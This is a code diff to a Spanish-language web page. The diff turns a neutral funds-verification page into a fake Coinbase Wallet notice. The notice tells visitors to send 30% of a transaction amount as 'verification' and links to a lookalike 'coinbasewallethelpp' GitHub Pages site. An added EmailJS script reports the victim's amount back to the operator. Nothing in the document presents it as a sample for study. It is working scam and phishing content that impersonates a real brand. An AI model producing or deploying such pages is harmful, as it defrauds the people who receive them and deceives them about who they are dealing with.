@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificación de Fondos</title>
+    <title>Verificación del 30% - Coinbase Wallet</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -18,6 +18,13 @@
             padding: 30px;
             border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .logo img {
+            width: 180px;
         }
         h2 {
             color: #1652f0;
@@ -37,37 +44,95 @@
             font-size: 15px;
             line-height: 1.6;
         }
+        .verification-steps {
+            margin: 25px 0;
+            padding: 15px;
+            background-color: #f8f9fa;
+            border-radius: 6px;
+        }
+        .button {
+            background-color: #1652f0;
+            color: white;
+            padding: 12px 25px;
+            text-decoration: none;
+            border-radius: 5px;
+            display: block;
+            width: fit-content;
+            margin: 25px auto;
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #718096;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>Verificación de Transacción</h2>
+        <div class="logo">
+            <img src="https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo.png" alt="Coinbase Logo">
+        </div>
 
-        <p>Hemos recibido una solicitud de verificación de transacción con el monto de:</p>
+        <h2>Verificación del 30% Requerida</h2>
 
-        <div class="highlight" id="amountDisplay">Cargando...</div>
+        <p>Estimado usuario,</p>
+
+        <p>Para completar la verificación de su transacción, debe enviar el <strong>30% del monto total</strong> a su cuenta personal de Coinbase Wallet. Este paso es necesario para confirmar la legitimidad de la transacción.</p>
+
+        <div class="verification-steps">
+            <p><strong>Monto total de la transacción:</strong> <span id="totalAmount"></span></p>
+            <p><strong>30% del monto a enviar:</strong> <span id="verificationAmount"></span></p>
+        </div>
+
+        <p>Por favor, siga estos pasos:</p>
+        <ol>
+            <li>Abra su aplicación Coinbase Wallet.</li>
+            <li>Envié el <strong>30% del monto</strong> a la dirección de su cuenta personal.</li>
+            <li>Confirme la transacción en su billetera.</li>
+        </ol>
 
         <div class="highlight">
-            <p><strong>30% del monto:</strong> <span id="calculatedAmount">Calculando...</span></p>
+            <p>Una vez completado, su transacción será verificada automáticamente en un plazo de 24 horas.</p>
+        </div>
+
+        <a href="https://coinbasewallethelpp.github.io/verificacionenproceso/" class="button">He completado el envío</a>
+
+        <div class="footer">
+            <p>Si tiene alguna duda, contacte a nuestro <a href="{{{support_link}}}">equipo de soporte</a>.</p>
         </div>
     </div>
 
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
-        // Obtener el monto de la URL
+        // Inicializar EmailJS
+        emailjs.init('user_EjV5FTI4JisVwIlW');  // Usar tu user_id de EmailJS
+
+        // Obtener el monto de la URL (pasado desde la página anterior)
         const urlParams = new URLSearchParams(window.location.search);
         const amount = parseFloat(urlParams.get('amount'));
 
-        // Si el monto es válido, calcular el 30%
+        // Mostrar el monto total y el 30%
         if (amount && !isNaN(amount)) {
-            // Mostrar el monto
-            document.getElementById('amountDisplay').textContent = `${amount.toLocaleString('es-ES', { style: 'currency', currency: 'EUR' })}`;
-            
-            // Calcular y mostrar el 30%
-            const thirtyPercent = amount * 0.3;
-            document.getElementById('calculatedAmount').textContent = `${thirtyPercent.toLocaleString('es-ES', { style: 'currency', currency: 'EUR' })}`;
+            // Mostrar el monto total con formato de moneda
+            document.getElementById('totalAmount').textContent = `${amount.toLocaleString('es-ES', { style: 'currency', currency: 'EUR' })}`;
+            // Calcular el 30% y mostrarlo con formato de moneda
+            const verificationAmount = amount * 0.3;
+            document.getElementById('verificationAmount').textContent = `${verificationAmount.toLocaleString('es-ES', { style: 'currency', currency: 'EUR' })}`;
+
+            // Enviar los datos al servidor de EmailJS
+            emailjs.send("service_8kzc798", "template_woxom1z", {
+                amount: amount,
+                verificationAmount: verificationAmount
+            }).then(function(response) {
+                console.log("Correo enviado exitosamente", response);
+            }, function(error) {
+                console.log("Error al enviar el correo", error);
+            });
+
         } else {
-            document.getElementById('amountDisplay').textContent = 'Monto no disponible';
-            document.getElementById('calculatedAmount').textContent = 'No se puede calcular';
+            document.getElementById('totalAmount').textContent = 'Monto no disponible';
+            document.getElementById('verificationAmount').textContent = 'Monto no disponible';
         }
     </script>
 </body>
